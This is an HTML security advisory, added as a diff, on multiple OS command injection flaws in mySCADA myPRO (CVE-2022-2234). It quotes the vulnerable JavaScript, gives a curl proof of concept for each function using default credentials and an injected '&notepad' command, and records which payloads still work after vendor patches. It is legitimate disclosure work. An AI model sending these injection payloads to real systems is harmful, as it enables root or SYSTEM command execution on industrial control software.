@@ -1,0 +1,251 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>aweSEC | Security Advisories</title>
+<link rel="shortcut icon" href="../images/favicon.ico">
+<link href="https://fonts.googleapis.com/css?family=Lato:300,300i,400,400i,700,700i,900,900i" rel="stylesheet">
+<link href="../styles/Style.css" rel="stylesheet" type="text/css">
+<link rel="stylesheet" href="../styles/atom-one-dark.min.css">
+<script src="../scripts/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</head>
+
+<body>
+<div id="Advisories" class="pages advisories">
+		<header>
+				<div class="main-menu">
+					<ul class="menu-list">
+						<li class="logo"><img src="../images/logomark-hol-wt.svg" alt="aweSEC logo mark" width="200"></li>
+						<li class="page-link"><a href="../index.html">HOME</a></li>
+						<li class="page-link"><a href="../advisories.html">ADVISORIES</a></li>
+						<li class="page-link"><a href="../index.html#contact">CONTACT</a></li>
+					</ul>
+				</div>
+			</header>
+	
+<div class="content-wrap">
+	<div class="content-box">
+		<h1>mySCADA myPRO Multiple OS Command Injection Vulnerabilities<span class="small">AWE-2022-059</span></h1>
+		<div class="scroll-box">
+		<table class="info-table">
+		  <tr>
+			<th>CVE ID</th>
+			<td>CVE-2022-2234</td>
+		  </tr>
+		  <tr>
+			<th>Vendor</th>
+			<td>mySCADA</td>
+		  </tr>
+		  <tr>
+			<th>Product</th>
+			<td>myPRO</td>
+		  </tr>
+		  <tr>
+			<th>Affected version</th>
+			<td>&#x2264; v8.26.0</td>
+		  </tr>
+		  <tr>
+			<th>Patched version</th>
+			<td>-</td>
+		  </tr>
+		  <tr>
+			<th>Summary</th>
+			<td>The application is vulnerable to multiple OS command injection vulnerabilities within different functions of the application, including the setApiPwd function, the setPwd function, the sendEmail function, the restoreBackup function, the createBackup function, the deleteBackup function and the updateFW function.<br /><br />
+			The web server is listening by default on TCP ports 80/443 on all network interfaces and will be launched automatically on system startup. It is being executed in the context of NT AUTHORITY\SYSTEM on Windows systems and in the context of root on Linux systems. An authenticated remote attacker can exploit these issues to inject arbitrary OS commands which will get executed in the context of NT AUTHORITY\SYSTEM (Windows) or root (Linux).<br /><br />
+			Since the vendor insisted that all highlighted issues stem from the same root cause, and CISA/ICS-CERT agreed with that statement, let's take a closer look. The following code snippets are taken from C:\Program Files\mySCADA\prj2\Scripts\main.js (v8.26.0), which contains the main application logic:<br /><br />
+			<b>setApiPwd</b><br />
+			The associated code for handling API passwords contains two different parameters, livePwd and histPwd:<br />
+			<div class="scrollX"><pre><code class="language-javascript">1789    else if(data.type === "setApiPwd")
+1790    {
+1791        debugger
+1792        var ret = {};
+1793        const { exec } = require('child_process');
+1794        var cmd = ""
+1795        if(data.livePwd)
+1796        {
+1797            cmd = "\""+global.conf_json.binFolder+"/myAuth\" -f " + global.conf_json.conf_file + " -m \""+data.livePwd.replace(/\"/g, "\\\"")+"\"";
+1798        }
+1799        if(data.histPwd)
+1800        {
+1801            if(cmd.length > 0)
+1802            {
+1803                cmd+= " && ";
+1804            }
+1805            cmd += "\""+global.conf_json.binFolder+"/myAuth\" -f " + global.conf_json.conf_file + " -l \""+data.histPwd.replace(/\"/g, "\\\"")+"\"";
+1806        }
+1807        exec(cmd, (err, stdout, stderr) => {</code></pre></div>
+			In line 1797, the command is constructed by concatenating various strings and parameters, including the user-controlled parameter livePwd, before passing it to an exec call on line 1807. The same pattern can be observed on line 1805, where the parameter histPwd is used instead.<br /><br />
+			The following proof-of-concept can be used to trigger the issue (the following examples use admin:admin, as that is the default account of the application, but the issues can be triggered from other accounts too):<div class="scrollX"><pre><code class="language-bash">curl -u "admin:admin" -d '{"type":"setApiPwd","livePwd":"test\"&#x26;notepad"}' -X POST http://[IP]/sss2</code></pre></div>
+			<br /><br />
+			<b>setPwd</b><br />
+			The code for handling project passwords can be invoked through the parameter setPwd:<br />
+			<div class="scrollX"><pre><code class="language-javascript">1772    else if(data.type === "setPwd")
+1773    {
+1774        debugger
+1775        var ret = {};
+1776        const { exec } = require('child_process');
+1777        var cmd="\""+global.conf_json.binFolder+"/myAuth\" -f " + global.conf_json.conf_file + " -g \"" + data.pwd.replace(/\"/g, "\\\"") + "\"";
+1778        exec(cmd, (err, stdout, stderr) => {</code></pre></div>
+			On line 1777, the command is constructed by concatenating various strings and parameters, including the user-controlled parameter pwd, before passing it to an exec call on the next line, 1778.<br /><br />
+			The following proof-of-concept can be used to trigger the issue:<div class="scrollX"><pre><code class="language-bash">curl -u "admin:admin" -d '{"type":"setPwd","pwd":"test\"&#x26;notepad"}' -X POST http://[IP]/sss2</code></pre></div>
+			<br /><br />
+			<b>sendEmail</b><br />
+			The code for sending emails can be invoked through the sendEmail parameter:<br />
+			<div class="scrollX"><pre><code class="language-javascript">1901    else if(data.type === "sendEmail")
+1902    {
+1903        debugger
+1904        var ret = {};         
+1905        
+1906        const { exec } = require('child_process');
+1907        var confPath;
+1908        
+1909        //TODO Escape " .match(/"(?:[^"\\]|\\.)*"/);
+1910        if(global.conf_json.os!="BOX")
+1911        {
+1912            confPath = global.conf_json.confPath + "/msmtp.conf";
+1913            var cmd= "\"" + global.conf_json.binFolder + "/myalerting\" -c " + global.conf_json.confPath + "/myscada.conf -m " + confPath + " -t \"" + data.addr.replace(/\"/g, "\\\"") + "\"";
+1914        }
+1915        else
+1916        {
+1917            confPath = "/etc/msmtprc";
+1918            var cmd= "\"" + global.conf_json.binFolder + "/myalerting\" -m " + confPath + " -t \"" + data.addr.replace(/\"/g, "\\\"") + "\"";   
+1919        }
+1920        exec(cmd, (err, stdout, stderr) => {</code></pre></div>
+			On lines 1913 and 1918, the command is constructed by concatenating various strings and parameters, including the user-controlled parameter addr, before passing it to an exec call on line 1920. On line 1909 is a supposed fix, however, it is commented out.<br /><br />
+			The following proof-of-concept can be used to trigger the issue:<div class="scrollX"><pre><code class="language-bash">curl -u "admin:admin" -d '{"type":"sendEmail","addr":"foo@bar.awesec\"&#x26;&#x26;notepad"}' -X POST http://[IP]/sss2 </code></pre></div><br /><br />
+			<b>restoreBackup</b><br />
+			The code for restoring the application from a backup can be invoked through the parameter restoreBackup:<br />
+			<div class="scrollX"><pre><code class="language-javascript">1550    else if(data.type === "restoreBackup")
+1551    {
+1552        //TODO osetrit OS commandf inject
+1553        var ret = {};
+1554        const { exec } = require('child_process');
+1555        if(data.manual)
+1556        {
+1557            
+1558            exec("/opt/myscada/bin/Backup -r " + data.filename, (err, stdout, stderr) => {
+1559				//[...]
+1589        else
+1590        {   
+1591            exec("/opt/myscada/bin/Backup -z " + data.filename, (err, stdout, stderr) => {
+1592				//[...]</code></pre></div>
+			On lines 1558 and 1591, the user-controlled parameter filename is used directly and passed to the exec call which invokes the Backup binary. The vendor also put a TODO comment there to fix the vulnerability (I had reported previously multiple issues in myPRO, including this one and some of the others, which apparently should have already been fixed).<br /><br />
+			The following proof-of-concept can be used to trigger the issue:<div class="scrollX"><pre><code class="language-bash">curl -u "admin:admin" -d '{"type":"restoreBackup","manual":"xx", "filename":"bbbbb&#x26;notepad"}' -X POST http://[IP]/sss2</code></pre></div><br /><br />
+			<b>createBackup</b><br />
+			The code for creating a backup of the application can be invoked through the parameter createBackup:<br />
+			<div class="scrollX"><pre><code class="language-javascript">1645    else if(data.type === "createBackup")
+1646    {
+1647        var ret = {};
+1648        const { exec } = require('child_process');        
+1649        exec("/opt/myscada/bin/Backup -b " + data.manualType, (err, stdout, stderr) => {
+1650			//[...]</code></pre></div>
+			On line 1649, the user-controlled parameter manualType is used directly and passed to the exec call which invokes the Backup binary.<br /><br />
+			The following proof-of-concept can be used to trigger the issue:<div class="scrollX"><pre><code class="language-bash">curl -u "admin:admin" -d '{"type":"createBackup","manualType":"aaa>bbb&#x26;notepad"}' -X POST http://[IP]/sss2</code></pre></div><br /><br />
+			<b>deleteBackup</b><br />
+			The code for deleting a backup can be invoked through the parameter deleteBackup:<br />
+			<div class="scrollX"><pre><code class="language-javascript">1660    else if(data.type === "deleteBackup")
+1661    {
+1662        var ret = {};
+1663        const { exec } = require('child_process');        
+1664        exec("/opt/myscada/bin/Backup -d " + data.filename, (err, stdout, stderr) => {
+1665			//[...]</code></pre></div>
+			On line 1664, the user-controlled parameter filename is used directly and passed to the exec call which invokes the Backup binary.<br /><br />
+			The following proof-of-concept can be used to trigger the issue:<div class="scrollX"><pre><code class="language-bash">curl -u "admin:admin" -d '{"type":"deleteBackup","filename":"aaa&#x26;notepad"}' -X POST http://[IP]/sss2</code></pre></div><br /><br />
+			<b>updateFW</b><br />
+			The code for updating the firmware can be invoked through the parameter updateFW:<br />
+			<div class="scrollX"><pre><code class="language-javascript">1950    else if(data.type === "updateFW")
+1951    {
+1952        debugger
+1953        
+1954        var ret = {};         
+1955        
+1956        const { exec } = require('child_process');
+1957        var cmd="//usr/local/bin/update_modem.sh /media/ram/" + data.filename;        
+1958        exec(cmd, (err, stdout, stderr) => {
+1959			//[...]</code></pre></div>
+			On lines 1957, the command is constructed by concatenating a hardcoded string and the user-controlled parameter filename, before passing it to an exec call on the next line, 1958.<br /><br />
+			The following proof-of-concept can be used to trigger the issue:<div class="scrollX"><pre><code class="language-bash">curl -u "admin:admin" -d '{"type":"updateFW","filename":"asdf & notepad"}' -X POST http://[IP]/sss2</code></pre></div><br /><br />
+			It is quite obvious that the developers made the same mistake in terms of copying and pasting the vulnerable code pattern for different functions, but it is also quite clear that it's not a single vulnerability but multiple different ones of the same bug class. This is further illustrated when one considers the specific context in which these calls are executed - validating input to conform to a valid email address is likely going to be different from a filename or password. Since there are multiple exec calls, each of them must be addressed individually, which unfortunately hasn't been done (I tried to highlight this multiple times to ICS-CERT/CISA when I had requested individual CVEs to adequately catalogue and track the vulnerabilities reported). In one of my earlier reports, <a href="AWE-2021-069.html">AWE-2021-069</a>/<a href="https://www.cisa.gov/uscert/ics/advisories/icsa-21-355-01">ICSA-21-355-01</a>, different CVEs were assigned, but for a subsequent report, <a href="AWE-2022-038.html">AWE-2022-038</a>/<a href="https://www.cisa.gov/uscert/ics/advisories/icsa-22-083-02">ICSA-22-083-02</a>, no more (the vendor argued that I had just found multiple ways of exploiting a single vulnerability, which CISA/ICS-CERT seemed to have agreed with based on their advisory).</a><br /><br />
+			Let's take a brief look at v8.27.0 (the <a href="https://www.myscada.org/changelog/?section=version-8-27-0">changelog</a> does not mention any security-related bug fixes), which the vendor stated fixed all reported issues, and which is accordingly listed in the advisory from CISA/ICS-CERT as the patched version: <br /><br />
+			- setApiPwd (livePwd & histPwd) - original PoC works without modification<br />
+			- setPwd - original PoC works without modification<br />
+			- sendEmail - original PoC works without modification<br />
+			- restoreBackup - original PoC does not work anymore:
+			<div class="scrollX"><pre><code class="language-javascript">1562        if(data.filename.match(/^[0-9]{9,11}_P?D?S?.tar$/)){</code></pre></div><br />
+			- createBackup - original PoC does not work anymore:<br />
+			<div class="scrollX"><pre><code class="language-javascript">1663        if(data.manualType.match(/^(S?D?P?)$/)){</code></pre></div><br />
+			- deleteBackup - original PoC does not work anymore:<br />
+			<div class="scrollX"><pre><code class="language-javascript">1686        if(data.filename.match(/^[0-9]{9,11}_P?D?S?.tar$/)){</code></pre></div><br />
+			- updateFW - original PoC works without modification<br /><br />
+			Last week, on August 24, the vendor released <a href="https://www.myscada.org/changelog/?section=version-8-28-0">v8.28.0</a>, which does mention a "General security improvement", albeit not specifically referring to the myPRO product. While I didn't bother anymore looking for bypasses, let's also take a brief look at this latest version too by again simply executing the original PoCs:<br /><br />
+			- setApiPwd (livePwd & histPwd) - original PoC works without modification<br />
+			- setPwd - original PoC works without modification<br />
+			- sendEmail - original PoC works without modification<br />
+			- restoreBackup - original PoC does not work anymore (same fix as from v8.27.0).<br />
+			- createBackup - original PoC does not work anymore (same fix as from v8.27.0).<br />
+			- deleteBackup - original PoC does not work anymore (same fix as from v8.27.0).<br />
+			- updateFW - original PoC does not work anymore:<br />
+			<div class="scrollX"><pre><code class="language-javascript">1990        var cmd="//usr/local/bin/update_modem.sh /media/ram/" + trimSpec(data.filename);
+1991 	//[...]
+2806 function trimSpec(strIn)
+2807 {
+2808    ret = strIn.replace(/[\&;`'\"\|\*\?\|\~\<\>\^\(\)\[\]\{\}\$\n\r\0]/g, "");
+2809    return ret;
+2810 }
+</code></pre></div>
+</code></pre></div>
+			<br />
+			<br />
+			</td>
+		  </tr>
+		  <tr class="resources">
+			<th>Resources</th>
+			<td><a href="https://www.cisa.gov/uscert/ics/advisories/icsa-22-235-03">ICS-CERT/CISA Advisory</a></td>
+		  </tr>
+		  <tr>
+			<th>Timeline</th>
+			<td>
+			01.04.2022: Report sent to ICS-CERT/CISA<br />
+			04.04.2022: Received tracking number from ICS-CERT/CISA<br />
+			25.04.2022: Asking ICS-CERT/CISA for a status update<br />
+			25.04.2022: ICS-CERT/CISA informs me that they haven't received feedback from the vendor<br />
+			02.05.2022: ICS-CERT/CISA informs me that the vendor confirmed that they got the report and are validating the issues<br />
+			14.05.2022: Asking ICS-CERT/CISA for a status update<br />
+			24.05.2022: ICS-CERT/CISA informs me that they contacted the vendor to ask for an update<br />
+			07.06.2022: ICS-CERT/CISA informs me that they contacted the vendor to ask for an update<br />
+			24.06.2022: Asking ICS-CERT/CISA for a status update<br />
+			24.06.2022: The vendor informed ICS-CERT/CISA that they have provided an update with fixes<br />
+			30.06.2022: ICS-CERT/CISA asks the vendor again for the patch details and advisory information<br />
+			14.07.2022: Asking ICS-CERT/CISA for a status update<br />
+			14.07.2022: ICS-CERT/CISA follows up again with the vendor to ask again for more details<br />
+			25.07.2022: ICS-CERT/CISA provides an advisory draft, containing a single CVE<br />
+			25.07.2022: Asking ICS-CERT/CISA for clarification, why the advisory draft only contains a single entry with one CVE<br />
+			01.08.2022: ICS-CERT/CISA explains that a single CVE is used, as all issues have the same CVSS scoring, CWE category and are mitigated through a single patch<br />
+			01.08.2022: Suggesting to ICS-CERT/CISA that CVEs should be assigned based on unique root cause, regardless of CVSS scores, CWE category and number of vulnerabilities patched within a single patch<br />
+			18.08.2022: ICS-CERT/CISA informs me that the vendor confirmed to them that all reported vulnerabilities stemmed from a single root cause, and that the vendor only desired a single CVE; Moreover, a patched version has been released<br />
+			18.08.2022: Highlighting again that the reported issues are in different functions and need to be addressed individually; asking if the patched version mentioned refers to v8.27.0, which was released in May<br />
+			19.08.2022: ICS-CERT/CISA confirms that the patched version is v8.27.0, and mentioned again that the vendor stated that all issues had a single root cause<br />
+			24.08.2022: ICS-CERT/CISA releases <a href="https://www.cisa.gov/uscert/ics/advisories/icsa-22-235-03">ICSA-22-235-03</a> for mySCADA myPro, containing an OS command injection vulnerability, reported by another researcher<br />
+			24.08.2022: Asking ICS-CERT/CISA if the vulnerability described in ICSA-22-235-03 is different from the ones that I had reported<br />
+			24.08.2022: ICS-CERT/CISA informs me that it appears to be the same as reported by me (I don't know which one specifically), but that the submission was handled by a different analyst; ICS-CERT/CISA will contact the vendor to get a confirmation if it is indeed the same issues that I had reported<br />
+			02.09.2022: ICS-CERT/CISA informs me that the vendor confirmed it was the same issue, and updated ICSA-22-235-03 to include my name in the acknowledgement  section<br />
+			03.09.2022: Release of this advisory and notification sent to ICS-CERT/CISA regarding v8.27.0 and v8.28.0<br />
+			</td>
+		  </tr>
+		  <tr>
+			<th>Credit</th>
+			<td>Michael Heinzl</td>
+		  </tr>
+		</table>
+	</div>
+	</div>
+</div>	
+
+<footer>
+  <p class="copyrights">© 2022 AWESEC. ALL RIGHTS RESERVED.</p>
+</footer>
+</div>
+</body>
+</html>
